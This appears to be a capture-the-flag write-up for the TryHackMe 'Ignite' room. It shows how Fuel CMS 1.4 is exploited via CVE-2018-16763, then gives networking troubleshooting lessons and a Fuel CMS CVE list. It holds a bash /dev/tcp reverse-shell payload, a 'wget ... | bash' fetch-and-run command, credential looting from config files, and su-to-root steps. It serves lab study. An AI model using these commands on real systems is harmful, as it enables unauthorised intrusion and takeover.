# TryHackMe: Ignite — Study Notes

*A full walkthrough of rooting the box, plus every troubleshooting lesson learned along the way.*

---

## 1. Box Summary

| Item | Detail |
|------|--------|
| Platform | TryHackMe |
| Room | Ignite |
| Target OS | Ubuntu (Apache + PHP) |
| Key service | HTTP (port 80) running **Fuel CMS 1.4** |
| Vulnerability | **CVE-2018-16763** — unauthenticated Remote Code Execution |
| Privilege escalation | Reused database password (`mememe`) for the Linux `root` account |
| Flags | `User.txt` (as `www-data`) and `Root.txt` (as `root`) |

**Attack chain in one line:** recon → find Fuel CMS 1.4 → exploit CVE-2018-16763 for RCE as `www-data` → read user flag → loot DB config for credentials → reverse shell → `su root` with reused password → read root flag.

---

## 2. The Attack Chain (What Actually Worked)

### Step 1 — Connect to the network
Before touching the target, you must be on the TryHackMe VPN.

```bash
sudo openvpn <your-thm-config>.ovpn      # wait for "Initialization Sequence Completed"
ip a show tun0                            # verify: state UP, and an IP is assigned
```

### Step 2 — Port scan
```bash
nmap -v -sS -A -T4 -Pn <target-ip>
```
- `-sS` SYN scan, `-A` OS/service/version detection + scripts, `-T4` faster timing.
- **`-Pn`** is the critical flag — it skips host discovery (ping) and assumes the host is up.

Result: **port 80 open** (HTTP).

### Step 3 — Web enumeration
Visit the site in a browser:
- `http://<target-ip>/robots.txt` → revealed `Disallow: /fuel/`
- `http://<target-ip>/` → homepage said **"Welcome to Fuel CMS — Version 1.4"**

Two independent hints both pointing at Fuel CMS.

### Step 4 — Identify the vulnerability
Fuel CMS 1.4 → **CVE-2018-16763**, an unauthenticated RCE. Confirmed the exploit exists locally:

```bash
searchsploit fuel              # search a single distinctive word (widest net)
searchsploit -m linux/webapps/47138.py   # mirror the exploit into current dir
```

> Metasploit had **no** module for this on the Kali build used — that's fine, the standalone Exploit-DB script is the common path for Ignite.

### Step 5 — Prep and run the exploit
`47138.py` is a Python **2** script that needed three fixes before running:

1. Set the target: `url = "http://<target-ip>"` (was `127.0.0.1:8881`)
2. Remove the Burp proxy: `r = requests.get(burp0_url)` (was `..., proxies=proxy`)
3. Run with Python 2 (it uses `raw_input` and `print` statements):

```bash
python2 47138.py
```

This drops you into a `cmd:` prompt — a simple "type a command, see output" interface (RCE as `www-data`).

### Step 6 — Read the user flag
```
cmd:id                          # uid=33(www-data) — confirms code execution
cmd:ls /home                    # www-data
cmd:ls -la /home/www-data       # revealed flag.txt (NOT user.txt!)
cmd:cat /home/www-data/flag.txt # => User.txt flag
```

### Step 7 — Loot credentials for privesc
```
cmd:cat /var/www/html/fuel/application/config/database.php
```
This exposed the database credentials in plaintext:
```php
'username' => 'root',
'password' => 'mememe',
```

### Step 8 — Get a real reverse shell
The `cmd:` interface can't run interactive programs like `su`, so upgrade to a proper shell.

**On Kali — build a payload file and serve it (avoids injection character problems):**
```bash
# terminal 1: create the payload (use your CURRENT tun0 IP!)
echo 'bash -i >& /dev/tcp/<your-tun0-ip>/4444 0>&1' > shell.sh
python3 -m http.server 80        # serve from the folder containing shell.sh

# terminal 2: listener
nc -lvnp 4444
```

**At the `cmd:` prompt (runs on the TARGET):**
```
cmd:wget -qO- <your-tun0-ip>/shell.sh|bash
```
The listener catches a shell from the target: `www-data@ubuntu`.

### Step 9 — Escalate to root
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # stabilise the TTY so su works
su root                                          # password: mememe
id                                               # uid=0(root)
cat /root/root.txt                               # => Root.txt flag
```

Done. Box rooted.

---

## 3. Troubleshooting Lessons (Where the Real Learning Happened)

These are the problems that came up during the solve. They're worth more than the exploit itself, because they recur on almost every box.

### Lesson 1 — "Host seems down" ≠ host is down
The first nmap said `host down` and never scanned ports. Cause: the target blocks ICMP ping, so nmap's discovery phase wrongly concluded it was offline.
**Fix:** `-Pn` skips discovery. On CTF networks, use it by default.

### Lesson 2 — A tunnel interface can exist but be dead
`ip a` showed `tun0` with `NO-CARRIER` / `state DOWN`. The interface existed with a stale IP but carried no traffic.
**Lesson:** "tun0 exists" isn't enough — check for `state UP` and that traffic actually flows.

### Lesson 3 — Use the right VPN for the right platform
An early config was the wrong file; connection was refused (`ECONNREFUSED`). Also learned: the username appears in the config filename, which can look confusing.
**Lesson:** HackTheBox and TryHackMe have separate VPNs/networks/machines — never interchangeable. Always download the config from the platform whose room you're doing.

### Lesson 4 — The VPN IP can change under you
The single biggest time-sink. Every VPN reconnect reassigned `tun0` (`.3` → `.5` → `.3` ...). Reverse shells failed because `shell.sh` and the fetch command pointed at an old IP.
**Fix / habit:** before every callback attempt, run `ip a show tun0` and make sure **three numbers match**: the IP in your payload file, the IP in your fetch command, and the current `tun0` IP.

### Lesson 5 — Target IP changes on redeploy
`10.129.167.51` became `10.128.150.58` after the VM was restarted.
**Habit:** re-check the room page's "Machine IP" after any redeploy or long pause, and update the exploit's `url` accordingly.

### Lesson 6 — Web-injection shells choke on special characters
Through the Fuel CMS injection, complex commands broke the underlying PHP (`create_function`), throwing `ParseError: unexpected 'import'`. The `*` wildcard also silently failed.
**Why:** the payload is wrapped in PHP and URL-encoded (`urllib.quote`), so characters like spaces, quotes, parentheses, `+`, and `*` corrupt it.
**Fixes (in order of preference):**
- Use **literal full paths**, avoid `*` and quotes.
- **Base64-encode** the payload so only safe characters travel — but watch out: `+` and `/` in base64 break URL encoding.
- **Most robust:** host the payload as a file and `wget`/`curl` it — only a single `|` pipe goes through the injection.

### Lesson 7 — Run the payload on the TARGET, not on yourself
Several attempts connected `192.168.x → 192.168.x` (Kali to itself) because the reverse-shell command was typed at the **Kali shell** instead of the **`cmd:` prompt**.
**Mental model — three different places:**
| Prompt | What it is | What goes here |
|--------|-----------|----------------|
| `┌──(root💀kali)-[~]` `#` | Your Kali shell | Start `nc`, `http.server`, build files |
| `cmd:` | The exploit (runs on target) | The reverse-shell / `curl` / `wget` command |
| `nano` editor | Text editor | File edits only |
**Proof it worked:** the callback source IP should be the **target's** IP (`10.128.150.58`), not your own.

### Lesson 8 — `python3 -m http.server` serves its *current directory*
Repeated `404 File not found` for `/shell.sh` even though the file existed — because the server was started in a different folder than the one holding the file.
**Fix:** `cd` into the folder with the payload, confirm with `ls`, then start the server there. Only run one server on the port.

### Lesson 9 — Reading output buried in HTML
Every `cmd:` response was wrapped in the CMS's error page (`<div>...preg_match...Backtrace`). Easy to think "nothing happened."
**Lesson:** the real command output is the small line(s) near the **top**, above the constant error scaffolding. The `preg_match(): Delimiter...` warning is harmless noise, not a failure.

### Lesson 10 — Small syntax details matter
- `python2` vs `python3`: the exploit used `raw_input()` and `print x` (Python 2 only). Python 3 renamed these to `input()` and `print(x)`.
- `wget -q0-` (zero) vs `wget -qO-` (capital O for **O**utput). A one-character typo = command silently does nothing.

### Lesson 11 — su needs a TTY
A raw reverse shell can't run `su` ("must be run from a terminal"). Upgrade first:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# alternatives: python -c '...'  |  script -qc /bin/bash /dev/null
```

---

## 4. Privilege Escalation — Why `mememe` Worked

The password came from a file **you read**, not from thin air:
```
/var/www/html/fuel/application/config/database.php  →  'password' => 'mememe'
```
That's the **MySQL database password**, stored in plaintext (as web apps always do somewhere). It worked for `su root` because of **password reuse** — the box author set the same password for the DB and the Linux root account.

**General privesc playbook when you land as `www-data`:**
1. Hunt config files for credentials:
   - `config/database.php` (Fuel CMS / CodeIgniter)
   - `wp-config.php` (WordPress)
   - `.env`, `config.php`, `settings.py` (Django)
2. Try any found password against other accounts: `su root`, `su <user>`, SSH.
3. Also check: `sudo -l`, SUID binaries (`find / -perm -4000 2>/dev/null`), cron jobs, kernel version.

---

## 5. Command Quick-Reference

```bash
# --- Connect ---
sudo openvpn <thm-config>.ovpn
ip a show tun0                        # confirm state UP + note your IP

# --- Recon ---
nmap -v -sS -A -T4 -Pn <target>      # -Pn: skip ping (host blocks ICMP)

# --- Exploit search ---
searchsploit fuel                    # search one distinctive word
searchsploit -m linux/webapps/47138.py

# --- Run exploit (after editing url + removing proxy) ---
python2 47138.py                     # gives cmd: prompt (RCE as www-data)

# --- Enumerate on target (at cmd:) ---
id
ls -la /home/<user>
cat /var/www/html/fuel/application/config/database.php

# --- Reverse shell: on Kali ---
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > shell.sh
python3 -m http.server 80            # from the folder with shell.sh
nc -lvnp 4444                        # separate terminal

# --- Reverse shell: at cmd: prompt (runs on target) ---
wget -qO- <YOUR_IP>/shell.sh|bash    # OR: curl <YOUR_IP>/shell.sh|bash

# --- Privesc in the caught shell ---
python3 -c 'import pty;pty.spawn("/bin/bash")'
su root                              # password: mememe
cat /root/root.txt
```

---

## 6. Key Takeaways (The 5 That Generalise)

1. **`-Pn`** whenever a host "seems down" but should be up — CTF boxes block ping.
2. **Match your IPs** — on a flaky VPN, payload IP == fetch IP == `tun0` IP, checked before every attempt.
3. **Injection shells hate special characters** — prefer a hosted file + `wget|bash` over complex one-liners.
4. **Reverse shells run on the target** — the callback's source must be the target's IP, not yours.
5. **Web apps leak credentials in config files, and people reuse passwords** — always loot configs, then try the password everywhere.

---

## 7. Fuel CMS — Known CVE Reference

A broader catalogue of Fuel CMS vulnerabilities, for study. Only **CVE-2018-16763** applies to Ignite (it runs 1.4); the rest are here for context and to show how one CMS accumulates issues across versions.

> Note: exact CVE numbers could only be confirmed for the RCE and one SQLi from public sources; several XSS/CSRF/injection entries are described without their CVE IDs. For the complete numbered list, use the authoritative sources at the bottom.

### Remote Code Execution
- **CVE-2018-16763** — Fuel CMS ≤ 1.4.1. Pre-auth RCE via the `pages/select/?filter=` parameter (also the `preview/` data parameter). **This is the one exploited on Ignite.** Critical, CVSS 9.8.
  Sources: [NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-16763) · [Exploit-DB 47138](https://www.exploit-db.com/exploits/47138) · [Pentest-Tools](https://pentest-tools.com/vulnerabilities-exploits/fuel-cms-141-remote-code-execution_2612)

### SQL Injection
- **CVE-2020-17463** — Fuel CMS 1.4.7. SQLi via the `col` parameter to `/pages/items`, `/permissions/items`, or `/navigation/items`. Severity 10. (The "col SQLi" seen in searchsploit.)
  Source: [Rapid7](https://www.rapid7.com/db/vulnerabilities/fuel-cms-cve-2020-17463/)
- **Fuel CMS 1.4.1** — SQLi via the `layout`, `published`, or `search_term` parameter to `pages/items`.
  Source: [Vulmon](https://vulmon.com/searchpage?q=fuel+cms)
- **Fuel CMS 1.4.13** — blind SQLi via the `col` parameter in the Activity Log (authenticated).
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)
- **Fuel CMS 1.5.2** — SQLi via the `id` parameter at `/controllers/Blocks.php`.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)

### Cross-Site Scripting (XSS)
- **Fuel CMS 1.4.4** — XSS in the Create Blocks admin section.
  Source: [Vulmon](https://vulmon.com/searchpage?q=fuel+cms)
- **Fuel CMS 1.5.1** — XSS on the Assets page via an SVG file; also stored XSS via a malicious `.pdf` upload (authenticated).
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)
- **Fuel CMS 1.5.2** — privilege-escalation XSS via `/fuel/blocks/` and `/fuel/pages`; reflected XSS via the `group_id` parameter.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)

### Cross-Site Request Forgery (CSRF)
- **Fuel CMS 1.4.4** — CSRF in `blocks/create/` (can trick an admin into executing arbitrary code).
  Source: [Vulmon](https://vulmon.com/searchpage?q=fuel+cms)
- **Fuel CMS 1.4.13** — CSRF allowing remote attackers to run arbitrary code.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)
- **Fuel CMS 1.5.0** — CSRF via a POST to `/fuel/sitevariables/delete/4`.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)

### Other
- **Host header attack** — Fuel CMS 1.5.0, via `fuel_constants.php` and `Asset.php`.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)
- **HTML Injection** — Fuel CMS 1.5.1.
  Source: [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-19221/product_id-49911/Thedaylightstudio-Fuel-Cms.html)

### Authoritative full-catalogue sources
- [CVEDetails — Fuel CMS](https://www.cvedetails.com/product/49911/Thedaylightstudio-Fuel-Cms.html?vendor_id=19221)
- [NVD](https://nvd.nist.gov/)
- [OpenCVE — Fuel CMS](https://app.opencve.io/cve/?product=fuel_cms&vendor=daylightstudio)
- [CVE.report — Fuel CMS](https://cve.report/software/thedaylightstudio/fuel_cms)

---

*Room complete: User.txt + Root.txt captured. The exploit was the easy part — the networking discipline and payload-delivery debugging were the real skills practiced here.*
